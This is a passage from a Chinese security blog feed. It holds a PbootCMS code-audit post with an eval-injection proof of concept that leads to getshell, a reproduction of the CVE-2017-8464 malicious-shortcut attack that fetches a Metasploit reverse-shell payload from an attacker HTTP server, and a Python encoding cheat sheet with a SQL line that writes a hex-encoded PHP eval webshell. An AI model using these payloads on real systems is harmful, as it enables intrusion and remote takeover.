class="string">&#x27;/\&#123;pboot:if\(([^&#125;]+)\)\&#125;([\s\S]*?)\&#123;\/pboot:if\&#125;/&#x27;</span>;</span><br><span class="line">    <span class="variable">$pattern2</span> = <span class="string">&#x27;/pboot:([0-9])+if/&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (preg_match_all(<span class="variable">$pattern</span>, <span class="variable">$content</span>, <span class="variable">$matches</span>)) &#123;</span><br><span class="line">        <span class="variable">$count</span> = count(<span class="variable">$matches</span>[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$count</span>; <span class="variable">$i</span> ++) &#123;</span><br><span class="line">            <span class="variable">$flag</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="variable">$out_html</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&#x27;if(&#x27;</span> . <span class="variable">$matches</span>[<span class="number">1</span>][<span class="variable">$i</span>] . <span class="string">&#x27;)&#123;$flag=&quot;if&quot;;&#125;else&#123;$flag=&quot;else&quot;;&#125;&#x27;</span>);</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/([\s\S]*)?\&#123;else\&#125;([\s\S]*)?/&#x27;</span>, <span class="variable">$matches</span>[<span class="number">2</span>][<span class="variable">$i</span>], <span class="variable">$matches2</span>)) &#123; <span class="comment">// 判断是否存在else</span></span><br><span class="line">                <span class="keyword">switch</span> (<span class="variable">$flag</span>) &#123;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&#x27;if&#x27;</span>: <span class="comment">// 条件为真</span></span><br><span class="line">                        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$matches2</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">                            <span class="variable">$out_html</span> = <span class="variable">$matches2</span>[<span class="number">1</span>];</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&#x27;else&#x27;</span>: <span class="comment">// 条件为假</span></span><br><span class="line">                        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$matches2</span>[<span class="number">2</span>])) &#123;</span><br><span class="line">                            <span class="variable">$out_html</span> = <span class="variable">$matches2</span>[<span class="number">2</span>];</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">elseif</span> (<span class="variable">$flag</span> == <span class="string">&#x27;if&#x27;</span>) &#123;</span><br><span class="line">                <span class="variable">$out_html</span> = <span class="variable">$matches</span>[<span class="number">2</span>][<span class="variable">$i</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 无限极嵌套解析</span></span><br><span class="line">            <span class="keyword">if</span> (preg_match(<span class="variable">$pattern2</span>, <span class="variable">$out_html</span>, <span class="variable">$matches3</span>)) &#123;</span><br><span class="line">                <span class="variable">$out_html</span> = str_replace(<span class="string">&#x27;pboot:&#x27;</span> . <span class="variable">$matches3</span>[<span class="number">1</span>] . <span class="string">&#x27;if&#x27;</span>, <span class="string">&#x27;pboot:if&#x27;</span>, <span class="variable">$out_html</span>);</span><br><span class="line">                <span class="variable">$out_html</span> = str_replace(<span class="string">&#x27;&#123;&#x27;</span> . <span class="variable">$matches3</span>[<span class="number">1</span>] . <span class="string">&#x27;else&#125;&#x27;</span>, <span class="string">&#x27;&#123;else&#125;&#x27;</span>, <span class="variable">$out_html</span>);</span><br><span class="line">                <span class="variable">$out_html</span> = <span class="keyword">$this</span>-&gt;parserIfLabel(<span class="variable">$out_html</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 执行替换</span></span><br><span class="line">            <span class="variable">$content</span> = str_replace(<span class="variable">$matches</span>[<span class="number">0</span>][<span class="variable">$i</span>], <span class="variable">$out_html</span>, <span class="variable">$content</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$content</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关键在：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$pattern</span> = <span class="string">&#x27;/\&#123;pboot:if\(([^&#125;]+)\)\&#125;([\s\S]*?)\&#123;\/pboot:if\&#125;/&#x27;</span>;</span><br><span class="line"><span class="variable">$pattern2</span> = <span class="string">&#x27;/pboot:([0-9])+if/&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (preg_match_all(<span class="variable">$pattern</span>, <span class="variable">$content</span>, <span class="variable">$matches</span>)) &#123;</span><br><span class="line">    <span class="variable">$count</span> = count(<span class="variable">$matches</span>[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$count</span>; <span class="variable">$i</span> ++) &#123;</span><br><span class="line">        <span class="variable">$flag</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable">$out_html</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;if(&#x27;</span> . <span class="variable">$matches</span>[<span class="number">1</span>][<span class="variable">$i</span>] . <span class="string">&#x27;)&#123;$flag=&quot;if&quot;;&#125;else&#123;$flag=&quot;else&quot;;&#125;&#x27;</span>);</span><br></pre></td></tr></table></figure><p>只经过简单的正则匹配之后就赋值，然后<code>eval()</code>执行。</p><p>到此需要寻在利用点。</p><h1 id="Poc"><a href="#Poc" class="headerlink" title="Poc"></a>Poc</h1><p>Poc:</p><p><code>&#123;pboot:if(phpinfo())&#125;!&#123;/pboot:if&#125;</code></p><p>最后经过寻找，只要发现后台能编辑的地方，基本上都能插入<code>IF条件语句标签</code>并能解析执行。</p><p><img src="/image/pbootcms/poc.png" alt="poc.png"></p><p>访问首页就可以看到<code>phpinfo</code>页面</p><p><img src="/image/phpinfo.png" alt="phpinfo.png"></p><p>然后尝试了多次多点均能Getshell.</p><h1 id="另外"><a href="#另外" class="headerlink" title="另外"></a>另外</h1><p>前台某处存在CSRF，利用其修改后台内容，但均有提升<code>修改成功</code>的页面，做不到无感知修改内容，因此<code>CSRF+IF条件语句标签</code>也是比较鸡肋。</p><p><img src="/image/pbootcms/mod.png" alt="mod.png"></p>]]></content>
    
    
    <summary type="html">&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;PBOOT CMS!想伱所想,让一切皆有可能!&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;PBOOT CMS!为伱所想,让一切皆有可能!&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;PBOOT CMS!做伱所想,让一切皆有可能!&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    
    <category term="代码审计" scheme="https://cr4ckm3.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="CMS" scheme="https://cr4ckm3.top/tags/CMS/"/>
    
  </entry>
  
  <entry>
    <title>一个快捷方式引发的xxx</title>
    <link href="https://cr4ckm3.top/2017/06/16/%E4%B8%80%E4%B8%AA%E5%BF%AB%E6%8D%B7%E6%96%B9%E5%BC%8F%E5%BC%95%E5%8F%91%E7%9A%84%E9%92%93%E9%B1%BC%E4%BA%8B%E4%BB%B6(%20CVE-2017-8464%20)/"/>
    <id>https://cr4ckm3.top/2017/06/16/%E4%B8%80%E4%B8%AA%E5%BF%AB%E6%8D%B7%E6%96%B9%E5%BC%8F%E5%BC%95%E5%8F%91%E7%9A%84%E9%92%93%E9%B1%BC%E4%BA%8B%E4%BB%B6(%20CVE-2017-8464%20)/</id>
    <published>2017-06-16T06:04:51.000Z</published>
    <updated>2019-08-30T10:00:41.573Z</updated>
    
    <content type="html"><![CDATA[<center><h1>``"声明：本文章供用于安全检测或网络攻防研究参考,如做非法用途后果自负。"``</h1></center><span id="more"></span><p>前两天刷朋友圈看到一篇关于windows的新漏洞,点击一个快捷方式便可被反弹shell。立马引起了我的兴趣。<br><a href="http://bobao.360.cn/learning/detail/3977.html">安全客的一篇文章</a></p><h2 id="0x00-CVE-2017-8464-震网三代"><a href="#0x00-CVE-2017-8464-震网三代" class="headerlink" title="0x00 CVE-2017-8464 (震网三代)"></a>0x00 CVE-2017-8464 (震网三代)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">漏洞编号： CVE-2017-8464</span><br><span class="line"></span><br><span class="line">漏洞等级： 严重</span><br><span class="line"></span><br><span class="line">漏洞概要：如果用户打开攻击者精心构造的恶意LNK文件，则会造成远程代码执行。成功利用此漏洞的攻击者可以获得与本地用户相同的用户权限。</span><br><span class="line"></span><br><span class="line">攻击者可以通过可移动驱动器（U盘）或远程共享等方式将包含恶意LNK文件和与之相关的恶意二进制文件传播给用户。当用户通过Windows资源管理器或任何能够解析LNK文件的程序打开恶意的LNK文件时，与之关联的恶意二进制代码将在目标系统上执行。</span><br><span class="line"></span><br><span class="line">受影响版本</span><br><span class="line"></span><br><span class="line">桌面系统：Windows 10, 7, 8.1, 8, Vista和Windows RT 8.1</span><br><span class="line"></span><br><span class="line">服务器系统：Windows Server 2016，2012，2008</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-8464">微软安全技术中心</a></p><p>从上面的链接看，微软6月13号发布了补丁的消息.<br>到目前6月16号，也就是我复现的时间，发现getshell还是挺容易的。</p><h2 id="0x01-设置监听端"><a href="#0x01-设置监听端" class="headerlink" title="0x01 设置监听端"></a>0x01 设置监听端</h2><p>首先用msf生成windows的反弹后门payload：<code>cherry.ps1</code><br><img src="/image/%E7%AC%AC%E4%B8%80%E6%AD%A5.png" alt="第一步"></p><p>其次用msf开启监听，并设置payload<br><img src="/image/%E7%AC%AC%E4%BA%8C%E6%AD%A5.png" alt="第二步"><br><img src="/image/%E7%AC%AC%E4%B8%89%E6%AD%A5.png"></p><p>到这里监听端已经准备好了。接下来就是把后门部署到服务器端、以及创建恶意快捷方式。</p><h2 id="0x02-部署服务器端"><a href="#0x02-部署服务器端" class="headerlink" title="0x02 部署服务器端"></a>0x02 部署服务器端</h2><p>在这里，我用的是Python的简易服务器。<br><img src="/image/%E5%BC%80%E5%90%AF%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1%E5%99%A8.png" alt="简易的HTTP服务"></p><p>当靶机点击快捷方式后，会向服务器请求<code>cherry.ps1</code>后门。</p><h2 id="0x03-生成快捷方式"><a href="#0x03-生成快捷方式" class="headerlink" title="0x03 生成快捷方式"></a>0x03 生成快捷方式</h2><p>生成一个远程的代码的快捷方式<br><img src="/image/%E7%AC%AC%E5%9B%9B%E6%AD%A5.png" alt="lnk"></p><p><img src="/image/%E5%AF%B9%E6%AF%94.png" alt="duibi"></p><p>左边是生成的快捷方式的最初图标，右边是替换之后的图标。</p><p>看表面，相信是分辨不出来的。估计也没人会在打开桌面的快捷方式之前会右键看属性再打开应用吧？</p><h2 id="0x04-反弹shell"><a href="#0x04-反弹shell" class="headerlink" title="0x04 反弹shell"></a>0x04 反弹shell</h2><p>当用户点击恶意快捷方式之后，监听端就会收到反弹回来的shell。</p><p><img src="/image/getshell.png" alt="getshell"><br>So , success！</p><h2 id="0x05-关于样本"><a href="#0x05-关于样本" class="headerlink" title="0x05 关于样本"></a>0x05 关于样本</h2><p>把生成的恶意快捷方式拿去扫描，得出的结果中只有6家可检测到是恶意脚本。<br><img src="/image/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90.png" alt="1"><br><img src="/image/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%902.png" alt="2"><br><img src="/image/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%903.png" alt="3"></p><p>到我上传扫描截止，可以看到：百度、360、腾讯、金山都没有报毒的。</p>]]></content>
    
    
    <summary type="html">&lt;center&gt;&lt;h1&gt;``&quot;声明：本文章供用于安全检测或网络攻防研究参考,如做非法用途后果自负。&quot;``&lt;/h1&gt;&lt;/center&gt;</summary>
    
    
    
    
    <category term="漏洞" scheme="https://cr4ckm3.top/tags/%E6%BC%8F%E6%B4%9E/"/>
    
    <category term="CVE" scheme="https://cr4ckm3.top/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>Python编码转换</title>
    <link href="https://cr4ckm3.top/2017/06/07/python%E7%BC%96%E7%A0%81/"/>
    <id>https://cr4ckm3.top/2017/06/07/python%E7%BC%96%E7%A0%81/</id>
    <published>2017-06-07T12:55:00.000Z</published>
    <updated>2019-08-30T10:00:44.373Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Python编码转换"><a href="#Python编码转换" class="headerlink" title="Python编码转换"></a><div style="text-align:center">Python编码转换</div></h1><h1 id="Python-2-lt-——-gt-Python-3"><a href="#Python-2-lt-——-gt-Python-3" class="headerlink" title="Python 2 &lt;——&gt;  Python 3"></a>Python 2 &lt;——&gt;  Python 3</h1><p>例子 <code>a = &#39;\xc4\xe3\xba\xc3&#39;</code></p><p>在<code>Python 2</code>中</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a </span><br><span class="line"><span class="string">&#x27;\xc4\xe3\xba\xc3&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> a</span><br><span class="line">你好</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = <span class="string">u&#x27;\u4f60\u597d&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a</span><br><span class="line"><span class="string">u&#x27;\u4f60\u597d&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> a</span><br><span class="line">你好</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b = <span class="string">b&#x27;\xe4\xbd\xa0\xe5\xa5\xbd&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b</span><br><span class="line"><span class="string">&#x27;\xe4\xbd\xa0\xe5\xa5\xbd&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> b</span><br><span class="line">浣犲ソ</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> b.encode(<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">你好</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b.encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;e4bda0e5a5bd&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在<code>Python 3</code>中</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = <span class="string">&#x27;\xc4\xe3\xba\xc3&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a </span><br><span class="line"><span class="string">&#x27;你好&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = <span class="string">u&#x27;\u4f60\u597d&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a</span><br><span class="line"><span class="string">&#x27;你好&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.encode(<span class="string">&#x27;gbk&#x27;</span>)</span><br><span class="line"><span class="string">b&#x27;\xc4\xe3\xba\xc3&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b = a.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="string">b&#x27;\xe4\xbd\xa0\xe5\xa5\xbd&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;你好&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>Python 2默认<code>ascii</code>编码</li><li>Python 3默认<code>utf-8</code>编码</li></ul><p>举个例子<br><code>a = &#39;你好&#39;</code></p><h2 id="在Python-2-中"><a href="#在Python-2-中" class="headerlink" title="在Python 2 中"></a>在Python 2 中</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = <span class="string">&#x27;你好&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a</span><br><span class="line"><span class="string">&#x27;\xc4\xe3\xba\xc3&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = <span class="string">u&#x27;你好&#x27;</span></span><br><span class="line"><span class="string">u&#x27;\u4f60\u597d&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="0x01-HEXtoUTF8"><a href="#0x01-HEXtoUTF8" class="headerlink" title="0x01 HEXtoUTF8"></a>0x01 HEXtoUTF8</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&gt;&gt;&gt;&gt; a = <span class="string">&#x27;e6bc8fe6b49ee6a380e6b58be8a1a8&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;\xe6\xbc\x8f\xe6\xb4\x9e\xe6\xa3\x80\xe6\xb5\x8b\xe8\xa1\xa8&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.decode(<span class="string">&#x27;hex&#x27;</span>).decode(<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line"><span class="string">u&#x27;\u6f0f\u6d1e\u68c0\u6d4b\u8868&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> a.decode(<span class="string">&#x27;hex&#x27;</span>).decode(<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">漏洞检测列表</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="0x02-URL编码"><a href="#0x02-URL编码" class="headerlink" title="0x02 URL编码"></a>0x02 URL编码</h1><p>url编码是一种浏览器用来打包表单输入的格式.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> urllib <span class="keyword">import</span> *</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>quote(<span class="string">&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>) <span class="comment">#URL编码</span></span><br><span class="line"><span class="string">&#x27;%3Cscript%3Ealert%281%29%3C/script%3E&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>unquote(<span class="string">&#x27;%3Cscript%3Ealert%281%29%3C/script%3E&#x27;</span>) <span class="comment">#URL解码</span></span><br><span class="line"><span class="string">&#x27;&lt;script&gt;alert(1)&lt;/script&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="0x03-Base64"><a href="#0x03-Base64" class="headerlink" title="0x03 Base64"></a>0x03 Base64</h1><p>Base64常常用作网页表单和HTTP传输的一些参数，也常用于邮件协议传输用户信息等。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> base64</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>base64.b64encode(<span class="string">&quot;admin&quot;</span>) <span class="comment">#base64加密</span></span><br><span class="line"><span class="string">&#x27;YWRtaW4=&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>base64.b64decode(<span class="string">&#x27;YWRtaW4=&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;admin&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>base32</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> base64</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>base64.b32encode(<span class="string">&#x27;admin&#x27;</span>)   <span class="comment">#base32加密</span></span><br><span class="line"><span class="string">&#x27;MFSG22LO&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>base64.b32decode(<span class="string">&#x27;MFSG22LO&#x27;</span>)    <span class="comment">#base32解密</span></span><br><span class="line"><span class="string">&#x27;admin&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="0x04-md5"><a href="#0x04-md5" class="headerlink" title="0x04 md5"></a>0x04 md5</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m = md5()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m.update(<span class="string">&#x27;admin&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m.hexdigest()</span><br><span class="line"><span class="string">&#x27;f6fdffe48c908deb0f4c3bd36c032e72&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="0x04-Unicode转中文-万国码"><a href="#0x04-Unicode转中文-万国码" class="headerlink" title="0x04 Unicode转中文(万国码)"></a>0x04 Unicode转中文(万国码)</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">print</span> <span class="string">u&#x27;\u9a8c\u8bc1\u7801\u9519\u8bef&#x27;</span></span><br><span class="line">验证码错误</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="0x05-Hex"><a href="#0x05-Hex" class="headerlink" title="0x05 Hex"></a>0x05 Hex</h1><p>MySQL注入可以使用hex绕过htmlspecialchars()函数从而写入webshell。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">0x3c3f70687020406576616c28245f504f53545b615d293b203f3e</span> <span class="keyword">into</span> outfile <span class="string">&#x27;/web/1.php&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Hex加解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&lt;?php @eval($POST[a]); ?&gt;&#x27;</span>.encode(<span class="string">&#x27;hex&#x27;</span>)   <span class="comment">#加密</span></span><br><span class="line"><span class="string">&#x27;3c3f70687020406576616c2824504f53545b615d293b203f3e&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;3c3f70687020406576616c2824504f53545b615d293b203f3e&#x27;</span>.decode(<span class="string">&#x27;hex&#x27;</span>)  <span class="comment">#解密</span></span><br><span class="line"><span class="string">&#x27;&lt;?php @eval($POST[a]); ?&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="0x06-Ascii"><a href="#0x06-Ascii" class="headerlink" title="0x06 Ascii"></a>0x06 Ascii</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>l = <span class="built_in">map</span>(<span class="built_in">ord</span>,<span class="string">&quot;&lt;?php phpinfo(); ?&gt;&quot;</span>)</span><br><span class="line">[<span class="number">60</span>, <span class="number">63</span>, <span class="number">112</span>, <span class="number">104</span>, <span class="number">112</span>, <span class="number">32</span>, <span class="number">112</span>, <span class="number">104</span>, <span class="number">112</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">102</span>, <span class="number">111</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">59</span>, <span class="number">32</span>, <span class="number">63</span>, <span class="number">62</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">chr</span>,l))</span><br><span class="line"><span class="string">&#x27;&lt;?php phpinfo(); ?&gt;&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Python编码转换&quot;&gt;&lt;a href=&quot;#Python编码转换&quot; class=&quot;headerlink&quot; title=&quot;Python编码转换&quot;&gt;&lt;/a&gt;&lt;div style=&quot;text-align:center&quot;&gt;Python编码转换&lt;/div&gt;&lt;/h1&gt;&lt;h1 </summary>
      
    
    
    
    
    <category term="笔记" scheme="https://cr4ckm3.top/tags/%E7%AC%94%E8%AE%B0/"/>
    
    <category term="Python" scheme="https://cr4ckm3.top/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>逻辑漏洞 Ⅲ</title>
    <link href="https://cr4ckm3.top/2017/06/07/%E8%B6%8A%E6%9D%83%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/"/>
    <id>https://cr4ckm3.top/2017/06/07/%E8%B6%8A%E6%9D%83%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/</id>
    <published>2017-06-07T12:16:00.000Z</published>
